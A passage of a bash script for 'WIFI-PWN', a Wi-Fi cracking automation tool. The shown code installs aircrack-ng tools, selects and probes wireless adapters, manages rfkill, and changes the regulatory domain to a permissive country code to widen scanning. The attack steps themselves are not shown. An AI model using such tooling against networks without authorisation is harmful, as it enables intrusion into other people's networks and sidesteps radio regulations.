#!/bin/bash
# ============================================================
#  WIFI-PWN  v2.3.2  —  WiFi Penetration Testing Automation
#  Team UNIT-61398
# ============================================================

umask 077

VERSION="2.3.2"
BUILD="full"

ORIG_INTERFACE=""
ORIG_WAS_MONITOR=0
MON_INTERFACE=""
MON_MODE=""
BSSID=""
CHANNEL=""
TARGET_ESSID=""
CAP_FILE=""
CAP_FILE_PATH=""
CAPTURE_FILE=""
WORDLIST=""
OUTPUT_DIR=""
PKG=""
SUDO_HOME_USER=""
WORK_DIR=""
PKG_LOG=""
CLEANUP_DONE=0
DEFER_STATE_CLEAR=0
SVC_STATE_CAPTURED=0
SVC_MANAGER=""
RFKILL_UNBLOCKED_BY_US=0
RFKILL_DEV=""
RFKILL_ORIG_SOFT=""
RFKILL_ORIG_HARD=""
RFKILL_MAP="unresolved"
OUTPUT_CREATED_BY_US=0
DISTRO_ID=""
DISTRO_LIKE=""
SCAN_LAST_CSV=""
SCAN_LAST_FILE=""
NETWORK_RESTORED=0
AUTO_RESTORE_AFTER_CAPTURE=1
AUTO_MONITOR_PROBE=1
RENAMED_TO=""
REG_DOMAIN_CHANGED=0
REG_DOMAIN_ORIG=""
RX_PROBE_COUNT=0

SYSFS_NET="${SYSFS_NET:-/sys/class/net}"
SYSFS_RFKILL="${SYSFS_RFKILL:-/sys/class/rfkill}"
SYSTEMD_RUN_DIR="${SYSTEMD_RUN_DIR:-/run/systemd/system}"
STATE_DIR="${STATE_DIR:-/var/lib/wifi-pwn}"

declare -A SVC_ORIG_STATE=()
declare -A SVC_STOPPED_BY_US=()
declare -a CHILD_PIDS=()

RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
CYAN=$'\033[0;36m'
WHITE=$'\033[1;37m'
DARK=$'\033[0;37m'
BOLD=$'\033[1m'
NC=$'\033[0m'

# ============================================================
tty_sane() { [[ -t 0 ]] && stty sane 2>/dev/null; return 0; }

hacker_read() {
    local var_name="$1" prompt_text="$2" __val=""
    tty_sane
    [[ -n "$prompt_text" ]] && echo -e "$prompt_text"
    echo -ne "${GREEN}[${WHITE}root${GREEN}@${RED}wifi-pwn${GREEN}]~# ${NC}"
    read -r __val || return 1
    [[ -n "$var_name" ]] && printf -v "$var_name" '%s' "$__val"
    return 0
}

pause_enter() {
    local msg="${1:-Press ENTER to continue}"
    tty_sane
    echo ""
    echo -ne "${GREEN}[${WHITE}ENTER${GREEN}]${NC} ${msg}: "
    read -r _ 2>/dev/null || true
}

ok()   { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[*]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*"; }

banner() {
    clear
    echo -e "${GREEN}"
    echo "  ██╗    ██╗██╗███████╗██╗     ██████╗ ███████╗███╗   ██╗████████╗"
    echo "  ██║    ██║██║██╔════╝██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝"
    echo "  ██║ █╗ ██║██║█████╗  ██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   "
    echo "  ██║███╗██║██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   "
    echo -e "  ╚███╔███╔╝██║██║     ███████╗██║     ███████╗██║ ╚████║   ██║   "
    echo -e "   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ${NC}"
    local W=66
    local DASHES
    DASHES=$(printf '═%.0s' $(seq 1 $W))
    echo -e "${DARK}╔${DASHES}╗${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${WHITE}C A P T U R E   W I - F I   |   C R A C K   P A S S W O R D${NC}   ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${RED}⚡${NC} ${YELLOW}S E T T I N G   U P   B R U T E F O R C E   A T T A C K${NC}       ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${CYAN}🛡️${NC} ${GREEN}B Y   T E A M   U N I T - 6 1 3 9 8${NC}                          ${DARK}║${NC}"
    echo -e "${DARK}║${NC}  ${CYAN}🌐${NC} ${WHITE}github.com/UNIT-61398${NC}                                         ${DARK}║${NC}"
    echo -e "${DARK}╚${DASHES}╝${NC}"
    echo ""
}

# ============================================================
init_workdir() {
    [[ -n "$WORK_DIR" && -d "$WORK_DIR" ]] && return 0
    WORK_DIR=$(mktemp -d "${TMPDIR:-/tmp}/wifi-pwn.XXXXXXXXXX") || {
        err "mktemp failed."; return 1; }
    chmod 700 "$WORK_DIR" 2>/dev/null
    PKG_LOG="$WORK_DIR/pkg-install.log"
    secure_touch "$PKG_LOG"
    return 0
}

secure_touch() {
    local f="$1"
    [[ -z "$f" ]] && return 1
    ( umask 077; : > "$f" ) 2>/dev/null || return 1
    chmod 600 "$f" 2>/dev/null
    return 0
}

cleanup_workdir() {
    [[ -n "$WORK_DIR" && -d "$WORK_DIR" ]] || return 0
    case "$WORK_DIR" in /|"") return 0 ;; esac
    rm -rf -- "$WORK_DIR" 2>/dev/null
    WORK_DIR=""
}

track_pid() { [[ -n "$1" ]] && CHILD_PIDS+=("$1"); return 0; }
pid_alive() { [[ -n "$1" ]] && kill -0 "$1" 2>/dev/null; }

reap_pids() {
    local -a keep=()
    local p
    for p in "${CHILD_PIDS[@]:-}"; do
        [[ -z "$p" ]] && continue
        pid_alive "$p" && keep+=("$p")
    done
    CHILD_PIDS=()
    for p in "${keep[@]:-}"; do [[ -n "$p" ]] && CHILD_PIDS+=("$p"); done
    return 0
}

kill_children() {
    local p
    for p in "${CHILD_PIDS[@]:-}"; do
        [[ -n "$p" ]] && pid_alive "$p" && kill -TERM "$p" 2>/dev/null
    done
    sleep 0.2
    for p in "${CHILD_PIDS[@]:-}"; do
        [[ -n "$p" ]] && pid_alive "$p" && kill -KILL "$p" 2>/dev/null
    done
    CHILD_PIDS=()
    return 0
}

# Kill anything still holding our work dir (catches untracked children)
kill_workdir_procs() {
    [[ -n "$WORK_DIR" ]] || return 0
    command -v pgrep >/dev/null 2>&1 || return 0
    local p
    for p in $(pgrep -f -- "$WORK_DIR" 2>/dev/null); do
        [[ "$p" == "$$" ]] && continue
        kill -TERM "$p" 2>/dev/null
    done
    sleep 0.3
    for p in $(pgrep -f -- "$WORK_DIR" 2>/dev/null); do
        [[ "$p" == "$$" ]] && continue
        kill -KILL "$p" 2>/dev/null
    done
    return 0
}

on_signal() {
    local sig="$1"
    (( CLEANUP_DONE )) && exit 0
    CLEANUP_DONE=1
    echo ""
    warn "Caught SIG${sig} — cleaning up..."
    local rc=0
    DEFER_STATE_CLEAR=1
    kill_children
    kill_workdir_procs
    tty_sane
    sleep 0.4
    disable_monitor || rc=1
    reg_restore
    rfkill_restore
    restore_service_state || rc=1
    verify_managed_present || rc=1
    cleanup_workdir
    tty_sane
    if (( rc == 0 )); then
        force_clear_state; DEFER_STATE_CLEAR=0; ok "Cleanup complete."
    else
        err "Cleanup INCOMPLETE — recovery state kept. Run [8] after restart."
    fi
    exit 0
}

# ============================================================
state_file() {
    local d="$STATE_DIR"
    if ! mkdir -p "$d" 2>/dev/null || [[ ! -w "$d" ]]; then
        d="${TMPDIR:-/tmp}/wifi-pwn-state"
        mkdir -p "$d" 2>/dev/null || return 1
    fi
    printf '%s/state' "$d"
}

save_state() {
    local f
    f=$(state_file) || return 1
    ( umask 077; {
        echo "STATE_VERSION=$VERSION"
        echo "ORIG_INTERFACE=$ORIG_INTERFACE"
        echo "ORIG_WAS_MONITOR=$ORIG_WAS_MONITOR"
        echo "MON_INTERFACE=$MON_INTERFACE"
        echo "MON_MODE=$MON_MODE"
        echo "SVC_NM=${SVC_STOPPED_BY_US[NetworkManager]:-0}"
        echo "SVC_WPA=${SVC_STOPPED_BY_US[wpa_supplicant]:-0}"
        echo "TS=$(date -Is)"
    } > "$f" ) 2>/dev/null
    chmod 600 "$f" 2>/dev/null
    return 0
}

clear_state() {
    (( DEFER_STATE_CLEAR )) && return 0
    force_clear_state
}

force_clear_state() {
    local f
    f=$(state_file) && rm -f -- "$f" 2>/dev/null
    return 0
}

report_stale_state() {
    local f
    f=$(state_file) || return 0
    [[ -f "$f" ]] || return 0
    echo -e "${YELLOW}--- previous run state found ---${NC}"
    echo "  $(tr '\n' ' ' < "$f" 2>/dev/null)"
    echo "  Use [8] CLEANUP / RECOVER to restore it."
    echo ""
    return 0
}

# ============================================================
check_root() {
    if [[ $EUID -ne 0 ]]; then err "Run as root (sudo)."; exit 1; fi
    SUDO_HOME_USER="${SUDO_USER:-}"
    [[ -z "$SUDO_HOME_USER" || "$SUDO_HOME_USER" == "root" ]] && SUDO_HOME_USER=""
}

detect_distro() {
    DISTRO_ID="unknown"; DISTRO_LIKE=""
    if [[ -r /etc/os-release ]]; then
        DISTRO_ID=$(. /etc/os-release 2>/dev/null; printf '%s' "${ID:-unknown}")
        DISTRO_LIKE=$(. /etc/os-release 2>/dev/null; printf '%s' "${ID_LIKE:-}")
    fi
    [[ -z "$DISTRO_ID" ]] && DISTRO_ID="unknown"
    return 0
}

detect_pkg_manager() {
    local c
    for c in apt-get dnf pacman zypper apk xbps-install eopkg; do
        command -v "$c" >/dev/null 2>&1 && { PKG="$c"; return 0; }
    done
    PKG=""; return 1
}

pkg_install() {
    [[ -z "$PKG" ]] && return 1
    [[ -z "$PKG_LOG" ]] && init_workdir
    local pkgs=("$@") rc=0
    { echo "=== $(date -Is) :: $PKG ${pkgs[*]} ==="; } >> "$PKG_LOG" 2>/dev/null
    case "$PKG" in
        apt-get) DEBIAN_FRONTEND=noninteractive apt-get install -y "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        dnf)     dnf install -y "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        pacman)  pacman -S --noconfirm --needed "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        zypper)  zypper --non-interactive install "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        apk)     apk add "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        xbps-install) xbps-install -y "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        eopkg)   eopkg install -y "${pkgs[@]}" </dev/null >>"$PKG_LOG" 2>&1 ;;
        *) return 1 ;;
    esac
    rc=$?
    echo "--- rc=$rc ---" >> "$PKG_LOG" 2>/dev/null
    return $rc
}

pkg_available() {
    local p="$1"
    [[ -z "$p" || -z "$PKG" ]] && return 1
    case "$PKG" in
        apt-get)      apt-cache show "$p" >/dev/null 2>&1 ;;
        dnf)          dnf -q info "$p" >/dev/null 2>&1 ;;
        pacman)       pacman -Si "$p" >/dev/null 2>&1 ;;
        zypper)       zypper --non-interactive info "$p" >/dev/null 2>&1 ;;
        apk)          apk search -x "$p" >/dev/null 2>&1 ;;
        xbps-install) xbps-query -R "$p" >/dev/null 2>&1 ;;
        eopkg)        eopkg info "$p" >/dev/null 2>&1 ;;
        *) return 1 ;;
    esac
}

pkg_name_for() {
    case "$1" in
        ip) case "$PKG" in dnf) echo iproute ;; *) echo iproute2 ;; esac; return ;;
        awk) echo gawk; return ;;
        ethtool) echo ethtool; return ;;
        iwconfig) echo wireless-tools; return ;;
        john) echo john; return ;;
        clinfo) echo clinfo; return ;;
        opencl) case "$PKG" in
                    apt-get) echo pocl-opencl-icd ;;
                    dnf) echo pocl ;;
                    pacman) echo pocl ;;
                    *) echo pocl ;;
                esac; return ;;
        wordlists) case "$DISTRO_ID" in kali|parrot) echo wordlists ;; *) echo seclists ;; esac; return ;;
    esac
    echo "$1"
}

need_tool() {
    local bin="$1" generic="${2:-$1}" pname
    command -v "$bin" >/dev/null 2>&1 && return 0
    pname=$(pkg_name_for "$generic")
    pkg_available "$pname" || { err "Missing $bin — '$pname' unavailable."; return 1; }
    warn "Installing $pname..."
    pkg_install "$pname" || { err "Install failed — $PKG_LOG"; return 1; }
    command -v "$bin" >/dev/null 2>&1
}

check_deps() {
    local missing=() b p
    local -a required=(airmon-ng airodump-ng aireplay-ng aircrack-ng awk ip iw)
    for b in "${required[@]}"; do
        command -v "$b" >/dev/null 2>&1 || missing+=("$b")
    done
    [[ ${#missing[@]} -eq 0 ]] && return 0
    err "Missing required tools: ${missing[*]}"
    detect_pkg_manager || { err "No supported package manager."; return 1; }
    hacker_read ans "Install now? (Y/n):"
    [[ "$ans" == "n" || "$ans" == "N" ]] && return 1
    init_workdir || return 1
    local aircrack_needed=0
    for b in "${missing[@]}"; do
        case "$b" in airmon-ng|airodump-ng|aireplay-ng|aircrack-ng) aircrack_needed=1 ;; esac
    done
    if (( aircrack_needed )); then
        p=$(pkg_name_for aircrack-ng)
        pkg_available "$p" && { pkg_install "$p" || err "Install failed: $p"; } || err "Unavailable: $p"
    fi
    for b in "${missing[@]}"; do
        case "$b" in airmon-ng|airodump-ng|aireplay-ng|aircrack-ng) continue ;; esac
        p=$(pkg_name_for "$b")
        pkg_available "$p" && { pkg_install "$p" || err "Install failed: $p"; } || err "Unavailable: $p"
    done
    local still=()
    for b in "${required[@]}"; do
        command -v "$b" >/dev/null 2>&1 || still+=("$b")
    done
    [[ ${#still[@]} -gt 0 ]] && { err "Still missing: ${still[*]}"; return 1; }
    ok "Dependencies satisfied."
    return 0
}

# ============================================================
user_can_write() {
    local d="$1"
    [[ -w "$d" ]] || return 1
    [[ -z "${SUDO_UID:-}" ]] && return 0
    local owner mode
    owner=$(stat -c %u "$d" 2>/dev/null) || return 1
    mode=$(stat -c %a "$d" 2>/dev/null) || return 1
    if [[ "$owner" == "$SUDO_UID" ]]; then
        (( (8#$mode & 8#200) != 0 )) && return 0
    fi
    (( (8#$mode & 8#002) != 0 ))
}

setup_output_dir() {
    if [[ -n "$OUTPUT_DIR" ]]; then
        CAP_FILE_PATH="${CAP_FILE_PATH:-$OUTPUT_DIR}"
        return 0
    fi
    local base=""
    if [[ -n "$SUDO_HOME_USER" ]]; then
        base=$(getent passwd "$SUDO_HOME_USER" 2>/dev/null | cut -d: -f6)
    fi
    [[ -z "$base" || ! -d "$base" ]] && base="$HOME"
    local -a candidates=()
    local desktop=""
    if [[ -n "$SUDO_HOME_USER" ]] && command -v sudo >/dev/null 2>&1 \
       && command -v xdg-user-dir >/dev/null 2>&1; then
        desktop=$(sudo -u "$SUDO_HOME_USER" xdg-user-dir DESKTOP 2>/dev/null)
    fi
    [[ -n "$desktop" && -d "$desktop" ]] && candidates+=("$desktop/WI-FI Pentest")
    local xdg="${XDG_DATA_HOME:-}"
    [[ -z "$xdg" ]] && xdg="$base/.local/share"
    candidates+=("$xdg/wifi-pwn" "$base/WI-FI Pentest" "/root/WI-FI Pentest" "${TMPDIR:-/tmp}/WI-FI Pentest")
    local d
    for d in "${candidates[@]}"; do
        local made=0
        if [[ ! -d "$d" ]]; then mkdir -p "$d" 2>/dev/null || continue; made=1; fi
        [[ -w "$d" ]] || continue
        if (( made )) || ! user_can_write "$d"; then
            if [[ -n "${SUDO_UID:-}" && -n "${SUDO_GID:-}" ]]; then
                chown "$SUDO_UID:$SUDO_GID" "$d" 2>/dev/null
                chmod 750 "$d" 2>/dev/null
            fi
            [[ "$made" == "1" ]] && OUTPUT_CREATED_BY_US=1
        fi
        user_can_write "$d" || { warn "Cannot write $d — next."; continue; }
        OUTPUT_DIR="$d"; break
    done
    [[ -z "$OUTPUT_DIR" ]] && { err "No writable output directory."; return 1; }
    CAP_FILE_PATH="$OUTPUT_DIR"
    ok "Output folder: $OUTPUT_DIR"
    return 0
}

# ============================================================
validate_bssid() { [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; }
validate_channel() {
    [[ "$1" =~ ^[0-9]{1,3}$ ]] || return 1
    (( $1 >= 1 && $1 <= 196 ))
}
validate_iface_name() { [[ "$1" =~ ^[A-Za-z0-9_.-]{1,15}$ ]]; }

# ============================================================
iface_exists()  { [[ -n "$1" && -d "$SYSFS_NET/$1" ]]; }

iface_is_wireless() {
    local i="$1"
    [[ -d "$SYSFS_NET/$i/phy80211" || -d "$SYSFS_NET/$i/wireless" ]] && return 0
    command -v iw >/dev/null 2>&1 && iw dev "$i" info >/dev/null 2>&1 && return 0
    return 1
}

iface_type() {
    local i="$1" t=""
    [[ -n "$i" ]] || { echo unknown; return 0; }
    if command -v iw >/dev/null 2>&1; then
        t=$(iw dev "$i" info 2>/dev/null \
            | awk '/^[[:space:]]*type[[:space:]]/{print $2; exit}')
    fi
    if [[ -z "$t" ]] && command -v iw >/dev/null 2>&1; then
        t=$(iw dev 2>/dev/null | awk -v want="$i" '
            /^[[:space:]]*Interface[[:space:]]/ { cur = $2; next }
            cur == want && /^[[:space:]]*type[[:space:]]/ { print $2; exit }')
    fi
    if [[ -z "$t" ]] && command -v iwconfig >/dev/null 2>&1; then
        local m
        m=$(iwconfig "$i" 2>/dev/null)
        case "$m" in
            *Mode:Monitor*) t="monitor" ;;
            *Mode:Managed*) t="managed" ;;
            *Mode:Master*)  t="AP" ;;
            *Mode:Ad-Hoc*)  t="IBSS" ;;
        esac
    fi
    [[ -z "$t" ]] && t="unknown"
    printf '%s' "$t"
}

iface_is_monitor() { [[ "$(iface_type "$1")" == monitor ]]; }

iface_phy() {
    local i="$1" p=""
    if command -v iw >/dev/null 2>&1; then
        p=$(iw dev "$i" info 2>/dev/null | awk '/wiphy /{print "phy"$2; exit}')
        [[ -n "$p" ]] && { echo "$p"; return 0; }
    fi
    if [[ -L "$SYSFS_NET/$i/phy80211" ]]; then
        basename "$(readlink -f "$SYSFS_NET/$i/phy80211")"; return 0
    fi
    return 1
}

iface_driver() {
    local i="$1" drv=""
    if [[ -e "$SYSFS_NET/$i/device/driver" ]]; then
        drv=$(basename "$(readlink -f "$SYSFS_NET/$i/device/driver" 2>/dev/null)")
    fi
    if [[ -z "$drv" ]] && command -v ethtool >/dev/null 2>&1; then
        drv=$(ethtool -i "$i" 2>/dev/null | awk '/^driver:/{print $2; exit}')
    fi
    echo "${drv:-unknown}"
}

iface_is_usb() {
    local path
    path=$(readlink -f "$SYSFS_NET/$1/device" 2>/dev/null)
    [[ "$path" == *"/usb"* ]]
}

phy_supports_monitor() {
    local phy="$1"
    [[ -z "$phy" ]] && return 1
    command -v iw >/dev/null 2>&1 || return 0
    iw phy "$phy" info 2>/dev/null | grep -qE '^[[:space:]]*\*[[:space:]]*monitor' && return 0
    return 1
}

phy_has_5ghz() {
    local phy="$1"
    [[ -z "$phy" ]] && return 1
    command -v iw >/dev/null 2>&1 || return 1
    iw phy "$phy" info 2>/dev/null | grep -qE '5[0-9]{3} MHz' && return 0
    return 1
}

phy_supported_modes() {
    local phy="$1"
    [[ -z "$phy" ]] && return 0
    iw phy "$phy" info 2>/dev/null | awk '
        /Supported interface modes/ { inm = 1; next }
        inm && /^[[:space:]]*\*[[:space:]]/ {
            sub(/^[[:space:]]*\*[[:space:]]*/, ""); gsub(/[[:space:]]+$/, ""); print; next
        }
        inm { exit }
    ' | paste -sd, -
    return 0
}

managed_count() {
    local i n=0
    while read -r i; do
        [[ -z "$i" ]] && continue
        iface_is_monitor "$i" && continue
        ((n++))
    done < <(discover_wireless_raw)
    echo "$n"
}

verify_managed_present() {
    local n
    n=$(managed_count)
    if (( n > 0 )); then
        ok "Managed wireless interface present ($n)."
        return 0
    fi
    err "No managed wireless interface present after cleanup!"
    warn "The adapter may still be in monitor mode or gone."
    report_iface_failure ""
    return 1
}

report_phy_caps() {
    local iface="$1" phy drv fw modes
    phy=$(iface_phy "$iface")
    [[ -z "$phy" ]] && warn "PHY: unresolved for $iface" || echo -e "${DARK}  PHY:       $phy${NC}"
    drv=$(iface_driver "$iface")
    echo -e "${DARK}  Driver:    $drv${NC}"
    iface_is_usb "$iface" && echo -e "${DARK}  Bus:       USB${NC}"
    case "$drv" in
        rt2800usb*|rt73usb*|rt2500usb*)
            echo -e "${DARK}  Note:      Ralink USB — monitor support varies per unit${NC}" ;;
    esac
    fw=$(dmesg 2>/dev/null | grep -i -- "$drv" | grep -i firmware | tail -1)
    [[ -n "$fw" ]] && echo -e "${DARK}  Firmware:  $fw${NC}"
    if ! command -v iw >/dev/null 2>&1; then
        warn "  Monitor capability: unknown (iw missing)"; return 0
    fi
    [[ -z "$phy" ]] && return 0
    modes=$(phy_supported_modes "$phy")
    echo -e "${DARK}  Modes:     ${modes:-unavailable}${NC}"
    if [[ ",$modes," == *",monitor,"* ]]; then
        echo -e "${GREEN}  Monitor:   supported${NC}"
    else
        echo -e "${RED}  Monitor:   NOT reported by driver${NC}"
    fi
    echo -e "${DARK}  Note:      PHY ids are dynamic${NC}"
    return 0
}

usb_wifi_visible() {
    local i
    while read -r i; do
        [[ -z "$i" ]] && continue
        iface_is_usb "$i" && return 0
    done < <(discover_wireless_raw)
    return 1
}

report_vm_status() {
    if [[ -d /sys/module/vmw_vmci || -d /sys/module/vboxguest || -d /sys/module/kvm ]]; then
        if usb_wifi_visible; then
            echo "  VM detected; USB Wi-Fi adapter visible — passthrough appears active."
        else
            echo "  VM detected; no USB Wi-Fi adapter visible — check passthrough."
        fi
    else
        echo "  bare metal (no VM module detected)"
    fi
    return 0
}

report_iface_failure() {
    local iface="${1:-}"
    echo ""
    echo -e "${YELLOW}--- interface diagnostics ---${NC}"
    if [[ -n "$iface" ]] && iface_exists "$iface"; then
        echo "  iface:   $iface"
        echo "  type:    $(iface_type "$iface")"
        report_phy_caps "$iface"
    else
        echo "  iface:   ${iface:-<none>} (no sysfs node)"
    fi
    command -v rfkill >/dev/null 2>&1 && { echo "  rfkill:"; rfkill list 2>/dev/null | sed 's/^/    /'; }
    echo "  driver/firmware log (last 8):"
    dmesg 2>/dev/null | grep -iE 'firmware|iwlwifi|ath|rtl|rt2|mt76|brcm' | tail -8 | sed 's/^/    /'
    echo "  VM:"; report_vm_status
    echo ""
    return 0
}

discover_wireless_raw() {
    local -a found=()
    local seen=" " n d
    if command -v iw >/dev/null 2>&1; then
        while read -r n; do [[ -n "$n" ]] && found+=("$n"); done \
            < <(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{print $2}')
    fi
    if [[ ${#found[@]} -eq 0 ]]; then
        for d in "$SYSFS_NET"/*; do
            [[ -e "$d" ]] || continue
            [[ -e "$d/phy80211" || -d "$d/wireless" ]] || continue
            found+=("$(basename "$d")")
        done
    fi
    if [[ ${#found[@]} -eq 0 ]] && command -v iwconfig >/dev/null 2>&1; then
        while read -r n; do [[ -n "$n" ]] && found+=("$n"); done \
            < <(iwconfig 2>/dev/null | awk '/IEEE 802\.11|Mode:/{print $1}')
    fi
    for n in "${found[@]}"; do
        [[ "$seen" == *" $n "* ]] && continue
        seen+="$n "
        iface_is_wireless "$n" || continue
        echo "$n"
    done
}

monitor_on_phy() {
    local phy="$1" i
    [[ -z "$phy" ]] && return 1
    while read -r i; do
        [[ -z "$i" ]] && continue
        [[ "$i" == "$ORIG_INTERFACE" ]] && continue
        iface_is_monitor "$i" || continue
        [[ "$(iface_phy "$i" 2>/dev/null)" == "$phy" ]] && { echo "$i"; return 0; }
    done < <(discover_wireless_raw)
    return 1
}

# ---- regulatory domain ----
reg_fix() {
    command -v iw >/dev/null 2>&1 || return 1
    local cur
    cur=$(iw reg get 2>/dev/null | awk '/^country/{print $2; exit}')
    [[ -z "$cur" ]] && return 1
    [[ "$cur" == "00" ]] || return 1
    REG_DOMAIN_ORIG="$cur"
    iw reg set BO >/dev/null 2>&1 || return 1
    REG_DOMAIN_CHANGED=1
    sleep 1
    ok "Regulatory domain set to BO (permissive) for scanning."
    return 0
}

reg_restore() {
    (( REG_DOMAIN_CHANGED )) || return 0
    command -v iw >/dev/null 2>&1 || { REG_DOMAIN_CHANGED=0; return 0; }
    [[ -n "$REG_DOMAIN_ORIG" ]] && iw reg set "$REG_DOMAIN_ORIG" >/dev/null 2>&1
    REG_DOMAIN_CHANGED=0
    warn "Regulatory domain restored to ${REG_DOMAIN_ORIG}."
    return 0
}

# ---- rfkill ----
rfkill_path_for() {
    local iface="$1" p
    for p in "$SYSFS_NET/$iface/phy80211"/rfkill* "$SYSFS_NET/$iface/device"/rfkill*; do
        [[ -e "$p" ]] || continue
        basename "$(readlink -f "$p" 2>/dev/null)"
        return 0
    done
    return 1
}

rfkill_record() {
    local iface="$1" name dev phy soft hard
    RFKILL_DEV=""; RFKILL_ORIG_SOFT=""; RFKILL_ORIG_HARD=""; RFKILL_MAP="unresolved"
    if name=$(rfkill_path_for "$iface"); then
        dev="$SYSFS_RFKILL/$name"
        [[ -e "$dev/soft" ]] || return 0
        RFKILL_MAP="sysfs"
    else
        phy=$(iface_phy "$iface")
        [[ -z "$phy" ]] && return 0
        local -a hits=()
        for dev in "$SYSFS_RFKILL"/rfkill*; do
            [[ -e "$dev/name" ]] || continue
            [[ "$(cat "$dev/name" 2>/dev/null)" == "$phy" ]] && hits+=("$dev")
        done
        (( ${#hits[@]} == 0 )) && return 0
        (( ${#hits[@]} > 1 )) && { RFKILL_MAP="ambiguous"; return 0; }
        dev="${hits[0]}"; RFKILL_MAP="phy-name"
    fi
    soft=$(cat "$dev/soft" 2>/dev/null)
    hard=$(cat "$dev/hard" 2>/dev/null)
    RFKILL_DEV="$dev"
    RFKILL_ORIG_SOFT="${soft:-unknown}"
    RFKILL_ORIG_HARD="${hard:-unknown}"
    return 0
}

rfkill_unblock_if_needed() {
    command -v rfkill >/dev/null 2>&1 || return 0
    case "$RFKILL_MAP" in
        unresolved) warn "rfkill: no device linked — state unknown."; return 0 ;;
        ambiguous)  warn "rfkill: several devices match — state unknown."; return 0 ;;
    esac
    [[ "$RFKILL_ORIG_HARD" == "1" ]] && { warn "HARD-blocked — software cannot fix."; return 0; }
    [[ "$RFKILL_ORIG_SOFT" == "1" ]] || return 0
    local a
    hacker_read a "Adapter soft-blocked. Unblock? (y/N):"
    [[ "$a" == "y" || "$a" == "Y" ]] || return 0
    rfkill unblock "$(basename "$RFKILL_DEV")" 2>/dev/null \
        && { RFKILL_UNBLOCKED_BY_US=1; ok "Soft block removed."; sleep 1; } \
        || err "rfkill unblock failed."
    return 0
}

rfkill_restore() {
    (( RFKILL_UNBLOCKED_BY_US )) || return 0
    [[ -n "$RFKILL_DEV" ]] || return 0
    command -v rfkill >/dev/null 2>&1 || return 0
    [[ "$(cat "$RFKILL_DEV/hard" 2>/dev/null)" == "1" ]] && return 0
    rfkill block "$(basename "$RFKILL_DEV")" 2>/dev/null \
        && warn "rfkill: original soft-block restored."
    RFKILL_UNBLOCKED_BY_US=0
    return 0
}

# ---- selection ----
select_interface() {
    warn "Detecting wireless interfaces..."
    local -a managed=() monitors=()
    local i t drv

    while read -r i; do
        [[ -z "$i" ]] && continue
        t=$(iface_type "$i")
        [[ "$t" == monitor ]] && monitors+=("$i") || managed+=("$i")
    done < <(discover_wireless_raw)

    if [[ ${#managed[@]} -eq 0 && ${#monitors[@]} -eq 0 ]]; then
        err "No wireless interface detected."
        report_iface_failure ""
        hacker_read manual "Interface name (empty to abort):"
        [[ -z "$manual" ]] && return 1
        validate_iface_name "$manual" || { err "Invalid name format."; return 1; }
        iface_exists "$manual" || { err "'$manual' does not exist."; return 1; }
        if ! iface_is_wireless "$manual"; then
            err "'$manual' is not wireless."; report_iface_failure "$manual"; return 1
        fi
        ORIG_INTERFACE="$manual"; ORIG_WAS_MONITOR=0
        iface_is_monitor "$manual" && ORIG_WAS_MONITOR=1
        finish_selection; return $?
    fi

    echo ""
    if [[ ${#managed[@]} -gt 0 ]]; then
        echo -e "${YELLOW}Managed wireless interfaces (preferred):${NC}"
        local idx=1
        for i in "${managed[@]}"; do
            t=$(iface_type "$i"); drv=$(iface_driver "$i")
            echo -e "  ${GREEN}$idx)${NC} $i  ${DARK}[type: $t | driver: $drv]${NC}"
            ((idx++))
        done
        echo ""
    fi
    if [[ ${#monitors[@]} -gt 0 ]]; then
        echo -e "${YELLOW}Interfaces already in monitor mode:${NC}"
        local midx=1
        for i in "${monitors[@]}"; do
            drv=$(iface_driver "$i")
            echo -e "  ${CYAN}m$midx)${NC} $i  ${DARK}[type: monitor | driver: $drv]${NC}"
            ((midx++))
        done
        echo ""
        echo -e "${DARK}  Selecting a monitor interface will not create another VIF."
        echo -e "  Cleanup converts it back to managed (never deletes it).${NC}"
        echo ""
    fi

    local choice
    if [[ ${#managed[@]} -gt 0 ]]; then
        hacker_read choice "Select number (or m<N> for a monitor iface):"
    else
        hacker_read choice "Select number (1 = ${monitors[0]}):"
    fi

    if [[ "$choice" =~ ^m([0-9]+)$ ]]; then
        local mi="${BASH_REMATCH[1]}"
        (( mi >= 1 && mi <= ${#monitors[@]} )) || { err "Invalid monitor selection."; return 1; }
        ORIG_INTERFACE="${monitors[$((mi-1))]}"; ORIG_WAS_MONITOR=1
    elif [[ "$choice" =~ ^[0-9]+$ ]]; then
        if (( choice >= 1 && choice <= ${#managed[@]} )); then
            ORIG_INTERFACE="${managed[$((choice-1))]}"; ORIG_WAS_MONITOR=0
        elif [[ ${#managed[@]} -eq 0 ]] && (( choice >= 1 && choice <= ${#monitors[@]} )); then
            ORIG_INTERFACE="${monitors[$((choice-1))]}"; ORIG_WAS_MONITOR=1
        else
            err "Invalid selection."; return 1
        fi
    elif [[ -n "$choice" ]] && iface_exists "$choice"; then
        validate_iface_name "$choice" || { err "Invalid name format."; return 1; }
        if ! iface_is_wireless "$choice"; then
            err "'$choice' is not wireless."; report_iface_failure "$choice"; return 1
        fi
        ORIG_INTERFACE="$choice"; ORIG_WAS_MONITOR=0
        iface_is_monitor "$choice" && ORIG_WAS_MONITOR=1
    else
        err "Invalid selection."; return 1
    fi

    finish_selection
}

finish_selection() {
    if (( ORIG_WAS_MONITOR )); then
        echo ""
